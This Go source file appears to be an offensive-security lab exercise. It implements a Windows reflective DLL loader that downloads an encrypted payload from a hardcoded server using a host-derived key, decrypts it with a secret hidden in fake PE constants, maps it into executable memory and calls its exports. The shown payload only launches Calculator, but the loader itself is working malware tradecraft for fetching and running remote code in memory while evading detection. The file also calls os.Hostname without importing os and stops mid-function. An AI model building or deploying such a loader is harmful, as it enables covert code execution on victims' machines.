//go:build windows
// +build windows

package main

import (
	"bytes"
	"crypto/tls"
	"encoding/binary"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"runtime"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// --- Existing PE Structures ---
type IMAGE_DOS_HEADER struct {
	Magic  uint16
	_      [58]byte
	Lfanew int32
} //nolint:revive
type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}                                                               //nolint:revive
type IMAGE_DATA_DIRECTORY struct{ VirtualAddress, Size uint32 } //nolint:revive
type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          uint8
	MinorLinkerVersion          uint8
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	DataDirectory               [16]IMAGE_DATA_DIRECTORY
} //nolint:revive
type IMAGE_SECTION_HEADER struct {
	Name                                                                                                     [8]byte
	VirtualSize, VirtualAddress, SizeOfRawData, PointerToRawData, PointerToRelocations, PointerToLinenumbers uint32
	NumberOfRelocations, NumberOfLinenumbers                                                                 uint16
	Characteristics                                                                                          uint32
}                                                                                                                 //nolint:revive
type IMAGE_BASE_RELOCATION struct{ VirtualAddress, SizeOfBlock uint32 }                                           //nolint:revive
type IMAGE_IMPORT_DESCRIPTOR struct{ OriginalFirstThunk, TimeDateStamp, ForwarderChain, Name, FirstThunk uint32 } //nolint:revive

type IMAGE_EXPORT_DIRECTORY struct { //nolint:revive // Windows struct
	Characteristics       uint32
	TimeDateStamp         uint32
	MajorVersion          uint16
	MinorVersion          uint16
	Name                  uint32 // RVA of the DLL name string
	Base                  uint32 // Starting ordinal number
	NumberOfFunctions     uint32 // Total number of exported functions (Size of EAT)
	NumberOfNames         uint32 // Number of functions exported by name (Size of ENPT & EOT)
	AddressOfFunctions    uint32 // RVA of the Export Address Table (EAT)
	AddressOfNames        uint32 // RVA of the Export Name Pointer Table (ENPT)
	AddressOfNameOrdinals uint32 // RVA of the Export Ordinal Table (EOT)
}

// --- Constants ---
const (
	IMAGE_DIRECTORY_ENTRY_EXPORT    = 0
	DLL_PROCESS_ATTACH              = 1
	IMAGE_DOS_SIGNATURE             = 0x5A4D
	IMAGE_NT_SIGNATURE              = 0x00004550
	IMAGE_DIRECTORY_ENTRY_BASERELOC = 5
	IMAGE_DIRECTORY_ENTRY_IMPORT    = 1
	IMAGE_REL_BASED_DIR64           = 10
	IMAGE_REL_BASED_ABSOLUTE        = 0
	IMAGE_ORDINAL_FLAG64            = uintptr(1) << 63
	MEM_COMMIT                      = 0x00001000
	MEM_RESERVE                     = 0x00002000
	MEM_RELEASE                     = 0x8000
	PAGE_READWRITE                  = 0x04
	PAGE_EXECUTE_READWRITE          = 0x40
	// Disguised PE constants used for shared secret generation
	SECTION_ALIGN_REQUIRED    = 0x53616D70 // "Samp"
	FILE_ALIGN_MINIMAL        = 0x6C652D6B // "le-k"
	PE_BASE_ALIGNMENT         = 0x65792D76 // "ey-v"
	IMAGE_SUBSYSTEM_ALIGNMENT = 0x616C7565 // "alue"
	PE_CHECKSUM_SEED          = 0x67891011 // Seed for second part
)

// --- Global Proc Address Loader ---
var (
	kernel32DLL        = windows.NewLazySystemDLL("kernel32.dll")
	procGetProcAddress = kernel32DLL.NewProc("GetProcAddress")
)

// --- Helper Functions ---
func sectionNameToString(nameBytes [8]byte) string {
	n := bytes.IndexByte(nameBytes[:], 0)
	if n == -1 {
		n = 8
	}
	return string(nameBytes[:n])
}
func machineTypeToString(machine uint16) string {
	switch machine {
	case 0x0:
		return "Unknown"
	case 0x14c:
		return "x86 (I386)"
	case 0x8664:
		return "x64 (AMD64)"
	case 0xaa64:
		return "ARM64"
	case 0x1c0:
		return "ARM"
	default:
		return "Other"
	}
}
func magicTypeToString(magic uint16) string {
	switch magic {
	case 0x10b:
		return "PE32 (32-bit)"
	case 0x20b:
		return "PE32+ (64-bit)"
	default:
		return "Unknown/Invalid"
	}
}

// Get system information for client identification
func getEnvironmentalID() (string, error) {
	// Get system volume information for environmental keying
	var volumeName [256]uint16 // Buffer for volume name (not used for ID)
	var volumeSerial uint32    // Variable to store the serial number

	// GetVolumeInformation for C: drive
	// We pass nil for pointers we don't need, except volumeSerial.
	err := windows.GetVolumeInformation(
		windows.StringToUTF16Ptr("C:\\"), // Target volume C:
		&volumeName[0],                   // Buffer for name (optional)
		uint32(len(volumeName)),          // Size of name buffer
		&volumeSerial,                    // Pointer to store serial number <<< IMPORTANT
		nil,                              // Pointer for max component length (optional)
		nil,                              // Pointer for file system flags (optional)
		nil,                              // Buffer for file system name (optional)
		0,                                // Size of file system name buffer
	)
	if err != nil {
		return "", fmt.Errorf("failed to get volume info: %w", err)
	}

	// Get hostname
	hostname, err := os.Hostname()
	if err != nil {
		return "", fmt.Errorf("failed to get hostname: %w", err)
	}

	// Combine information to create a unique but predictable client ID
	// Format: <first 5 chars of hostname>-<volume serial as hex>
	shortName := hostname
	if len(hostname) > 5 {
		shortName = hostname[:5] // Truncate hostname if longer than 5 chars
	}

	// Use Sprintf with %x verb to format the serial number as lowercase hex
	clientID := fmt.Sprintf("%s-%x", shortName, volumeSerial)
	fmt.Printf("[+] Generated Client ID: %s\n", clientID)

	return clientID, nil
}

// --- Main Function ---
func main() {
	// Ensure running on Windows
	if runtime.GOOS != "windows" {
		log.Fatal("[-] This program must be run on Windows.")
	}

	fmt.Println("[+] Reflective Loader Agent (Network Download)")

	// --- Configuration ---
	serverURL := "https://192.168.2.123:8443/update"

	fmt.Println("[+] Generating client ID from environment...")
	clientID, err := getEnvironmentalID()
	if err != nil {
		log.Fatalf("[-] Failed to generate client ID: %v", err)
	}

	// --- Download Payload ---
	fmt.Println("[+] Downloading payload...")
	obfuscatedBytes, timestampUsed, err := downloadPayload(serverURL, clientID)
	if err != nil {
		log.Fatalf("[-] Failed to download payload: %v", err)
	}
	// NOTE: obfuscatedBytes now holds the raw downloaded data

	// --- Derive Key (using downloaded parameters) ---
	fmt.Println("[+] Deriving decryption key...")
	sharedSecret := generatePEValidationKey()
	// IMPORTANT: Use the timestamp that was actually sent in the request!
	finalKey := deriveKeyFromParams(timestampUsed, clientID, sharedSecret)
	fmt.Printf("    Using Timestamp for Key: %s\n", timestampUsed)
	fmt.Printf("    Using ClientID for Key: %s\n", clientID)
	// fmt.Printf("    Shared Secret (generated): %s\n", sharedSecret) // Debug
	// fmt.Printf("    Final Key (derived, Hex): %X\n", []byte(finalKey)) // Debug

	// --- Decrypt using Rolling XOR and Derived Key ---
	fmt.Println("[+] Decrypting downloaded content...")
	dllBytes := xorEncryptDecrypt(obfuscatedBytes, []byte(finalKey)) // Decrypt
	fmt.Printf("[+] Decryption complete. Resulting size: %d bytes.\n", len(dllBytes))

	reader := bytes.NewReader(dllBytes)

	var dosHeader IMAGE_DOS_HEADER
	if err := binary.Read(reader, binary.LittleEndian, &dosHeader); err != nil {
		log.Fatalf("[-] Failed to read DOS header: %v\n", err)
	}
	if dosHeader.Magic != IMAGE_DOS_SIGNATURE {
		log.Fatalf("[-] Invalid DOS signature")
	}
	if _, err := reader.Seek(int64(dosHeader.Lfanew), 0); err != nil {
		log.Fatalf("[-] Failed to seek to NT Headers: %v\n", err)
	}
	var peSignature uint32
	if err := binary.Read(reader, binary.LittleEndian, &peSignature); err != nil {
		log.Fatalf("[-] Failed to read PE signature: %v\n", err)
	}
	if peSignature != IMAGE_NT_SIGNATURE {
		log.Fatalf("[-] Invalid PE signature")
	}
	var fileHeader IMAGE_FILE_HEADER
	if err := binary.Read(reader, binary.LittleEndian, &fileHeader); err != nil {
		log.Fatalf("[-] Failed to read File Header: %v\n", err)
	}
	var optionalHeader IMAGE_OPTIONAL_HEADER64
	if err := binary.Read(reader, binary.LittleEndian, &optionalHeader); err != nil {
		log.Fatalf("[-] Failed to read Optional Header: %v\n", err)
	}
	if optionalHeader.Magic != 0x20b {
		log.Printf("[!] Warning: Optional Header Magic is not PE32+ (0x20b).")
	}
	fmt.Println("[+] Parsed PE Headers successfully.")
	fmt.Printf("[+] Target ImageBase: 0x%X\n", optionalHeader.ImageBase)
	fmt.Printf("[+] Target SizeOfImage: 0x%X (%d bytes)\n", optionalHeader.SizeOfImage, optionalHeader.SizeOfImage)

	// --- Step 2: Allocate Memory for DLL ---
	fmt.Printf("[+] Allocating 0x%X bytes of memory for DLL...\n", optionalHeader.SizeOfImage)
	allocSize := uintptr(optionalHeader.SizeOfImage)
	preferredBase := uintptr(optionalHeader.ImageBase)
	allocBase, err := windows.VirtualAlloc(preferredBase, allocSize, windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	if err != nil {
		fmt.Printf("[*] Failed to allocate at preferred base 0x%X: %v. Trying arbitrary address...\n", preferredBase, err)
		allocBase, err = windows.VirtualAlloc(0, allocSize, windows.MEM_RESERVE|windows.MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
		if err != nil {
			log.Fatalf("[-] Failed to allocate memory at arbitrary address: %v\n", err)
		}
	}
	fmt.Printf("[+] DLL memory allocated successfully at actual base address: 0x%X\n", allocBase)
	defer func() {
		fmt.Printf("[+] Attempting to free main DLL allocation at 0x%X...\n", allocBase)
		err := windows.VirtualFree(allocBase, 0, windows.MEM_RELEASE)
		if err != nil {
			log.Printf("[!] Warning: Failed to free main DLL memory: %v\n", err)
		} else {
			fmt.Println("[+] Main DLL memory freed successfully.")
		}
	}()

	// --- Step 3: Copy Headers into Allocated Memory ---
	fmt.Printf("[+] Copying PE headers (%d bytes) to allocated memory...\n", optionalHeader.SizeOfHeaders)
	headerSize := uintptr(optionalHeader.SizeOfHeaders)
	dllBytesPtr := uintptr(unsafe.Pointer(&dllBytes[0]))
	var bytesWritten uintptr
	err = windows.WriteProcessMemory(windows.CurrentProcess(), allocBase, (*byte)(unsafe.Pointer(dllBytesPtr)), headerSize, &bytesWritten)
	if err != nil || bytesWritten != headerSize {
		log.Fatalf("[-] Failed to copy PE headers to allocated memory: %v (Bytes written: %d)", err, bytesWritten)
	}
	fmt.Printf("[+] Copied %d bytes of headers successfully.\n", bytesWritten)

	// --- Step 4: Copy Sections into Allocated Memory ---
	fmt.Println("[+] Copying sections...")
	firstSectionHeaderAddr := allocBase + uintptr(dosHeader.Lfanew) + 4 + unsafe.Sizeof(fileHeader) + uintptr(fileHeader.SizeOfOptionalHeader) // Address of first section header IN allocBase
	sectionHeaderSize := unsafe.Sizeof(IMAGE_SECTION_HEADER{})
	numSections := fileHeader.NumberOfSections
	for i := uint16(0); i < numSections; i++ {
		currentSectionHeaderAddr := firstSectionHeaderAddr + uintptr(i)*sectionHeaderSize
		sectionHeader := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(currentSectionHeaderAddr))
		// sectionName := sectionNameToString(sectionHeader.Name) // Less verbose logging
		if sectionHeader.SizeOfRawData == 0 {
			continue
		}
		if uintptr(sectionHeader.PointerToRawData)+uintptr(sectionHeader.SizeOfRawData) > uintptr(len(dllBytes)) {
			log.Printf("[!] Warning: Section %d ('%s') raw data exceeds file size. Skipping copy.", i, sectionNameToString(sectionHeader.Name))
			continue
		}
		sourceAddr := dllBytesPtr + uintptr(sectionHeader.PointerToRawData)
		if uintptr(sectionHeader.VirtualAddress)+uintptr(sectionHeader.SizeOfRawData) > allocSize {
			log.Printf("[!] Warning: Section %d ('%s') virtual address/size exceeds allocated size. Skipping copy.", i, sectionNameToString(sectionHeader.Name))
			continue
		}
		destAddr := allocBase + uintptr(sectionHeader.VirtualAddress)
		sizeToCopy := uintptr(sectionHeader.SizeOfRawData)
		err = windows.WriteProcessMemory(windows.CurrentProcess(), destAddr, (*byte)(unsafe.Pointer(sourceAddr)), sizeToCopy, &bytesWritten)
		if err != nil || bytesWritten != sizeToCopy {
			log.Fatalf("    [-] Failed to copy section '%s': %v (Bytes written: %d)", sectionNameToString(sectionHeader.Name), err, bytesWritten)
		}
	}
	fmt.Println("[+] All sections copied.")

	// --- Step 5: Process Base Relocations ---
	fmt.Println("[+] Checking if base relocations are needed...")
	delta := int64(allocBase) - int64(optionalHeader.ImageBase)
	if delta == 0 {
		fmt.Println("[+] Image loaded at preferred base. No relocations needed.")
	} else {
		fmt.Printf("[+] Image loaded at non-preferred base (Delta: 0x%X). Processing relocations...\n", delta)
		relocDirEntry := optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
		relocDirRVA := relocDirEntry.VirtualAddress
		relocDirSize := relocDirEntry.Size
		if relocDirRVA == 0 || relocDirSize == 0 {
			fmt.Println("[!] Warning: Image rebased, but no relocation directory found or empty.")
		} else {
			fmt.Printf("[+] Relocation Directory found at RVA 0x%X, Size 0x%X\n", relocDirRVA, relocDirSize)
			relocTableBase := allocBase + uintptr(relocDirRVA)
			relocTableEnd := relocTableBase + uintptr(relocDirSize)
			currentBlockAddr := relocTableBase
			totalFixups := 0
			for currentBlockAddr < relocTableEnd {
				if currentBlockAddr < allocBase || currentBlockAddr+unsafe.Sizeof(IMAGE_BASE_RELOCATION{}) > allocBase+allocSize {
					log.Printf("[!] Error: Relocation block address 0x%X is outside allocated range. Stopping relocations.", currentBlockAddr)
					break
				}
				blockHeader := (*IMAGE_BASE_RELOCATION)(unsafe.Pointer(currentBlockAddr))
				if blockHeader.VirtualAddress == 0 || blockHeader.SizeOfBlock <= uint32(unsafe.Sizeof(IMAGE_BASE_RELOCATION{})) {
					break
				}
				if currentBlockAddr+uintptr(blockHeader.SizeOfBlock) > relocTableEnd {
					log.Printf("[!] Error: Relocation block size (%d) at 0x%X exceeds directory bounds. Stopping relocations.", blockHeader.SizeOfBlock, currentBlockAddr)
					break
				}
				numEntries := (blockHeader.SizeOfBlock - uint32(unsafe.Sizeof(IMAGE_BASE_RELOCATION{}))) / 2
				entryPtr := currentBlockAddr + unsafe.Sizeof(IMAGE_BASE_RELOCATION{})
				for i := uint32(0); i < numEntries; i++ {
					entryAddr := entryPtr + uintptr(i*2)
					if entryAddr < allocBase || entryAddr+2 > allocBase+allocSize {
						log.Printf("    [!] Error: Relocation entry address 0x%X is outside allocated range. Skipping entry.", entryAddr)
						continue
					}
					entry := *(*uint16)(unsafe.Pointer(entryAddr))
					relocType := entry >> 12
					offset := entry & 0xFFF
					if relocType == IMAGE_REL_BASED_DIR64 {
						patchAddr := allocBase + uintptr(blockHeader.VirtualAddress) + uintptr(offset)
						if patchAddr < allocBase || patchAddr+8 > allocBase+allocSize {
							log.Printf("        [!] Error: Relocation patch address 0x%X is outside allocated range. Skipping fixup.", patchAddr)
							continue
						}
						originalValuePtr := (*uint64)(unsafe.Pointer(patchAddr))
						*originalValuePtr = uint64(int64(*originalValuePtr) + delta)
						totalFixups++
					} else if relocType != IMAGE_REL_BASED_ABSOLUTE {
						fmt.Printf("        [!] Warning: Skipping unhandled relocation type %d at offset 0x%X\n", relocType, offset)
					}
				}
				currentBlockAddr += uintptr(blockHeader.SizeOfBlock)
			}
			fmt.Printf("[+] Relocation processing complete. Total fixups applied: %d\n", totalFixups)
		}
	}
	// --- End Step 5 ---

	// --- Step 6: Process Import Address Table (IAT) ---
	fmt.Println("[+] Processing Import Address Table (IAT)...")
	importDirEntry := optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
	importDirRVA := importDirEntry.VirtualAddress
	if importDirRVA == 0 {
		fmt.Println("[*] No Import Directory found. Skipping IAT processing.")
	} else {
		fmt.Printf("[+] Import Directory found at RVA 0x%X\n", importDirRVA)
		importDescSize := unsafe.Sizeof(IMAGE_IMPORT_DESCRIPTOR{})
		importDescBase := allocBase + uintptr(importDirRVA)
		importCount := 0

		for i := 0; ; i++ {
			currentDescAddr := importDescBase + uintptr(i)*importDescSize
			if currentDescAddr < allocBase || currentDescAddr+importDescSize > allocBase+allocSize {
				log.Printf("    [!] Error: Calculated descriptor address 0x%X is outside allocated range. Stopping IAT processing.", currentDescAddr)
				break
			}
			// fmt.Printf("\n    DEBUG: Reading descriptor %d at address 0x%X\n", i, currentDescAddr) // Keep DEBUG optional
			importDesc := (*IMAGE_IMPORT_DESCRIPTOR)(unsafe.Pointer(currentDescAddr))
			// fmt.Printf("        DEBUG: Desc %d: OFT=0x%X, TS=0x%X, FC=0x%X, NameRVA=0x%X, FT=0x%X\n", i, importDesc.OriginalFirstThunk, importDesc.TimeDateStamp, importDesc.ForwarderChain, importDesc.Name, importDesc.FirstThunk) // Keep DEBUG optional

			if importDesc.OriginalFirstThunk == 0 && importDesc.FirstThunk == 0 { /* fmt.Printf("    DEBUG: Null descriptor found at index %d. Stopping.\n", i); */
				break
			}
			importCount++

			dllNameRVA := importDesc.Name
			if dllNameRVA == 0 {
				log.Printf("    [!] Warning: Descriptor %d has null Name RVA. Skipping.", i)
				continue
			}
			dllNamePtrAddr := allocBase + uintptr(dllNameRVA)
			// fmt.Printf("        DEBUG: DLL Name String RVA=0x%X, VA=0x%X\n", dllNameRVA, dllNamePtrAddr)
			if dllNamePtrAddr < allocBase || dllNamePtrAddr >= allocBase+allocSize {
				log.Printf("    [!] Error: Calculated DLL Name VA 0x%X is outside allocated range. Skipping descriptor %d.", dllNamePtrAddr, i)
				continue
			}
			dllNamePtr := (*byte)(unsafe.Pointer(dllNamePtrAddr))
			dllName := windows.BytePtrToString(dllNamePtr)
			fmt.Printf("    [->] Processing imports for: %s\n", dllName)

			hModule, err := windows.LoadLibrary(dllName)
			if err != nil {
				log.Fatalf("    [-] FATAL: Failed to load dependency library '%s': %v\n", dllName, err)
			}
			// fmt.Printf("        [+] Loaded '%s' successfully. Handle: 0x%X\n", dllName, hModule) // Less verbose

			iltRVA := importDesc.OriginalFirstThunk
			if iltRVA == 0 {
				iltRVA = importDesc.FirstThunk
			}
			iatRVA := importDesc.FirstThunk
			if iltRVA == 0 || iatRVA == 0 {
				log.Printf("    [!] Warning: Descriptor %d for '%s' has null ILT/IAT RVA. Skipping.", i, dllName)
				continue
			}
			iltBase := allocBase + uintptr(iltRVA)
			iatBase := allocBase + uintptr(iatRVA)
			entrySize := unsafe.Sizeof(uintptr(0))
			// fmt.Printf("        DEBUG: ILT VA=0x%X, IAT VA=0x%X\n", iltBase, iatBase)

			for j := uintptr(0); ; j++ {
				iltEntryAddr := iltBase + (j * entrySize)
				iatEntryAddr := iatBase + (j * entrySize)
				if iltEntryAddr < allocBase || iltEntryAddr >= allocBase+allocSize {
					log.Printf("    [!] Error: Calculated ILT Entry VA 0x%X is outside allocated range. Stopping imports for %s.", iltEntryAddr, dllName)
					break
				}
				iltEntry := *(*uintptr)(unsafe.Pointer(iltEntryAddr))
				// fmt.Printf("            DEBUG: Reading ILT Entry %d at 0x%X, Value=0x%X\n", j, iltEntryAddr, iltEntry)

				if iltEntry == 0 {
					break
				}

				var funcAddr uintptr
				var procErr error
				importNameStr := ""

				if iltEntry&IMAGE_ORDINAL_FLAG64 != 0 {
					ordinal := uint16(iltEntry & 0xFFFF)
					importNameStr = fmt.Sprintf("Ordinal %d", ordinal)
					// fmt.Printf("            DEBUG: Importing by %s\n", importNameStr)
					ret, _, callErr := procGetProcAddress.Call(uintptr(hModule), uintptr(ordinal))
					if ret == 0 {
						errMsg := fmt.Sprintf("GetProcAddress by ordinal %d returned NULL", ordinal)
						if callErr != nil && callErr != windows.ERROR_SUCCESS {
							procErr = fmt.Errorf("%s - syscall error: %w", errMsg, callErr)
						} else {
							procErr = errors.New(errMsg)
						}
					} else if callErr != nil && callErr != windows.ERROR_SUCCESS {
						procErr = fmt.Errorf("GetProcAddress by ordinal %d syscall failed: %w", ordinal, callErr)
					}
					funcAddr = ret
				} else {
					hintNameRVA := uint32(iltEntry)
					hintNameAddr := allocBase + uintptr(hintNameRVA)
					// fmt.Printf("            DEBUG: Importing by Name. Hint/Name RVA=0x%X, VA=0x%X\n", hintNameRVA, hintNameAddr)
					if hintNameAddr < allocBase || hintNameAddr+2 >= allocBase+allocSize {
						log.Printf("        [!] Error: Calculated Hint/Name VA 0x%X is outside allocated range. Skipping import.", hintNameAddr)
						continue
					}
					funcNamePtr := unsafe.Pointer(hintNameAddr + 2)
					funcName := windows.BytePtrToString((*byte)(funcNamePtr))
					importNameStr = fmt.Sprintf("Function '%s'", funcName)
					// fmt.Printf("            DEBUG: Importing %s\n", importNameStr)
					funcAddr, procErr = windows.GetProcAddress(hModule, funcName)
					if procErr != nil && funcAddr == 0 {
						procErr = fmt.Errorf("GetProcAddress failed for %s: %w", funcName, procErr)
					} else if procErr == nil && funcAddr == 0 {
						procErr = fmt.Errorf("GetProcAddress returned NULL for %s", funcName)
					}
				}

				if procErr != nil || funcAddr == 0 {
					log.Fatalf("        [-] FATAL: Failed to resolve import %s from %s: %v (Addr: 0x%X)\n", importNameStr, dllName, procErr, funcAddr)
				}

				if iatEntryAddr < allocBase || iatEntryAddr >= allocBase+allocSize {
					log.Printf("        [!] Error: Calculated IAT Entry VA 0x%X is outside allocated range. Skipping patch for %s.", iatEntryAddr, importNameStr)
					continue
				}
				iatEntryPtr := (*uintptr)(unsafe.Pointer(iatEntryAddr))
				*iatEntryPtr = funcAddr
				// fmt.Printf("            [+] Resolved %s -> 0x%X. Patched IAT at 0x%X.\n", importNameStr, funcAddr, iatEntryAddr) // Less verbose
			} // End inner loop
			fmt.Printf("    [+] Finished imports for '%s'.\n", dllName)
		} // End outer loop
		fmt.Printf("[+] Import processing complete (%d DLLs).\n", importCount)
	}
	// --- *** End Step 6 *** ---

	// --- Step 7: Call DLL Entry Point (DllMain) ---
	fmt.Println("[+] Locating and calling DLL Entry Point (DllMain)...")
	dllEntryRVA := optionalHeader.AddressOfEntryPoint

	if dllEntryRVA == 0 {
		fmt.Println("[*] DLL has no entry point (AddressOfEntryPoint is 0). Skipping DllMain call.")
	} else {
		entryPointAddr := allocBase + uintptr(dllEntryRVA)
		fmt.Printf("[+] Entry Point found at RVA 0x%X (VA 0x%X).\n", dllEntryRVA, entryPointAddr)
		fmt.Printf("[+] Calling DllMain(0x%X, DLL_PROCESS_ATTACH, 0)...\n", allocBase)

		// Call DllMain: BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
		// Arguments:
		//   hinstDLL = base address of DLL (allocBase)
		//   fdwReason = DLL_PROCESS_ATTACH (1)
		//   lpvReserved = 0 (standard for dynamic loads)
		ret, _, callErr := syscall.SyscallN(entryPointAddr, allocBase, DLL_PROCESS_ATTACH, 0)

		// Check for errors during the system call itself
		// Note: '0' corresponds to ERROR_SUCCESS for the syscall status
		if callErr != 0 {
			log.Fatalf("    [-] Syscall error during DllMain call: %v\n", callErr)
			// Consider cleanup before fatal exit if needed
		}

		// Check the boolean return value from DllMain itself
		// DllMain returns TRUE (non-zero) on success, FALSE (zero) on failure for attach.
		if ret != 0 { // Non-zero means TRUE
			fmt.Printf("    [+] DllMain executed successfully (returned TRUE).\n")
		} else { // Zero means FALSE
			// Failure during DLL_PROCESS_ATTACH usually means the DLL cannot initialize
			log.Fatalf("    [-] DllMain reported initialization failure (returned FALSE). Aborting.\n")
			// Consider cleanup before fatal exit if needed
		}
	}

	// --- Step 8: Find and Call Exported Function ---
	targetFunctionName := "LaunchCalc" // The function we want to call
	fmt.Printf("[+] Locating exported function: %s\n", targetFunctionName)

	var targetFuncAddr uintptr = 0 // Initialize to 0 (not found)

	// Find the Export Directory entry
	exportDirEntry := optionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
	exportDirRVA := exportDirEntry.VirtualAddress
	// exportDirSize := exportDirEntry.Size // Size might be useful for boundary checks

	if exportDirRVA == 0 {
		log.Println("[-] DLL has no Export Directory. Cannot find exported function.")
		// Depending on requirements, might be fatal or just skip this step
	} else {
		fmt.Printf("[+] Export Directory found at RVA 0x%X\n", exportDirRVA)
		exportDirBase := allocBase + uintptr(exportDirRVA) // VA of IMAGE_EXPORT_DIRECTORY
		exportDir := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(exportDirBase))

		// Calculate the absolute addresses of the EAT, ENPT, and EOT
		eatBase := allocBase + uintptr(exportDir.AddressOfFunctions)    // Export Address Table VA
		enptBase := allocBase + uintptr(exportDir.AddressOfNames)       // Export Name Pointer Table VA
		eotBase := allocBase + uintptr(exportDir.AddressOfNameOrdinals) // Export Ordinal Table VA

		fmt.Printf("    NumberOfNames: %d, NumberOfFunctions: %d\n", exportDir.NumberOfNames, exportDir.NumberOfFunctions)
		fmt.Println("[+] Searching Export Name Pointer Table (ENPT)...")

		// Iterate through the names in ENPT
		for i := uint32(0); i < exportDir.NumberOfNames; i++ {
			// Get RVA of the function name string from ENPT
			nameRVA := *(*uint32)(unsafe.Pointer(enptBase + uintptr(i*4))) // ENPT stores RVAs (4 bytes)
			// Get VA of the function name string
			nameVA := allocBase + uintptr(nameRVA)
			// Read the function name string
			funcName := windows.BytePtrToString((*byte)(unsafe.Pointer(nameVA)))

			// Uncomment for verbose debugging:
			// fmt.Printf("    [%d] Checking Name: '%s'\n", i, funcName)

			// Check if this is the function name we are looking for
			if funcName == targetFunctionName {
				fmt.Printf("    [+] Found target function name '%s' at index %d.\n", targetFunctionName, i)
				// Get the ordinal for this name from EOT using the same index i
				// EOT stores WORDs (2 bytes)
				ordinal := *(*uint16)(unsafe.Pointer(eotBase + uintptr(i*2)))
				fmt.Printf("        Ordinal: %d\n", ordinal)

				// Use the ordinal as an index into the EAT to get the function's RVA
				// EAT stores RVAs (4 bytes)
				// Note: The ordinal is the direct index into the EAT array
				funcRVA := *(*uint32)(unsafe.Pointer(eatBase + uintptr(ordinal*4)))
				fmt.Printf("        Function RVA: 0x%X\n", funcRVA)

				// Calculate the final absolute Virtual Address of the target function
				targetFuncAddr = allocBase + uintptr(funcRVA)
				fmt.Printf("[+] Target function '%s' located at VA: 0x%X\n", targetFunctionName, targetFuncAddr)
				break // Exit loop once found
			}
		} // End name search loop

		// Check if we found the function
		if targetFuncAddr == 0 {
			log.Printf("[-] Target function '%s' not found in Export Directory.\n", targetFunctionName)
			// Decide if this is fatal based on application logic
		} else {
			// --- Call the Exported Function ---
			fmt.Printf("[+] Calling target function '%s' at 0x%X...\n", targetFunctionName, targetFuncAddr)

			// LaunchCalc signature is: BOOL LaunchCalc() - takes 0 arguments
			ret, _, callErr := syscall.SyscallN(targetFuncAddr, 0, 0, 0, 0)

			if callErr != 0 {
				log.Printf("    [-] Syscall error during '%s' call: %v\n", targetFunctionName, callErr)
				// Consider if this is fatal
			} else {
				// Check the boolean return value from LaunchCalc
				if ret != 0 { // Non-zero means TRUE
					fmt.Printf("    [+] Exported function '%s' executed successfully (returned TRUE).\n", targetFunctionName)
					fmt.Println("        ==> Check if Calculator launched! <==")
				} else { // Zero means FALSE
					fmt.Printf("    [-] Exported function '%s' reported failure (returned FALSE).\n", targetFunctionName)
				}
			}
		}
	} // End else (Export Directory found)

	// --- Step 9: Self-Check (Basic) --- (Renumbered)
	fmt.Println("\n[+] ===== FINAL LOADER STATUS =====") // Separator for final checks
	fmt.Println("[+] Manual mapping & execution process complete.")
	fmt.Println("[+] Self-Check Suggestion:")
	fmt.Printf("    - Verify console output shows successful completion of all stages (Parse, Alloc, Map, Reloc Check, IAT, DllMain, Export Call).\n") // Updated
	fmt.Printf("    - PRIMARY CHECK: Verify that '%s' was launched successfully!\n", "calc.exe")                                                       // Updated
	fmt.Printf("    - (Optional) Use Process Hacker/Explorer to observe the loader process briefly running and launching the payload.\n")              // Updated

	fmt.Println("\n[+] Press Enter to free memory and exit.")
	fmt.Scanln()

	fmt.Println("[+] Mapper finished.")

}

func xorEncryptDecrypt(data []byte, key []byte) []byte {
	// ... (implementation from Lab 7.1) ...
	keyBytes := []byte(key)
	keyLen := len(keyBytes)
	result := make([]byte, len(data))
	if len(data) == 0 {
		return []byte{}
	}
	if keyLen == 0 {
		// Handle empty key case if necessary, maybe return data unmodified or error
		log.Println("[!] Warning: Rolling XOR key derived is empty. Returning original data.")
		copy(result, data)
		return result
	}
	for i := 0; i < len(data); i++ {
		keyByte := keyBytes[i%keyLen] ^ byte(i&0xFF)
		result[i] = data[i] ^ keyByte
	}
	return result
}

// Helper to construct first part of shared secret
func getPESectionAlignmentString() string {
	buffer := make([]byte, 16)
	binary.LittleEndian.PutUint32(buffer[0:4], SECTION_ALIGN_REQUIRED)
	binary.LittleEndian.PutUint32(buffer[4:8], FILE_ALIGN_MINIMAL)
	binary.LittleEndian.PutUint32(buffer[8:12], PE_BASE_ALIGNMENT)
	binary.LittleEndian.PutUint32(buffer[12:16], IMAGE_SUBSYSTEM_ALIGNMENT)
	return string(buffer) // Returns "Sample-key-value"
}

// Helper to construct second part of shared secret
func verifyPEChecksumValue(seed uint32) string {
	result := make([]byte, 4)
	checksum := seed
	for i := 0; i < 4; i++ {
		checksum = ((checksum << 3) | (checksum >> 29)) ^ uint32(i*0x37)
		result[i] = byte(checksum & 0xFF)
	}
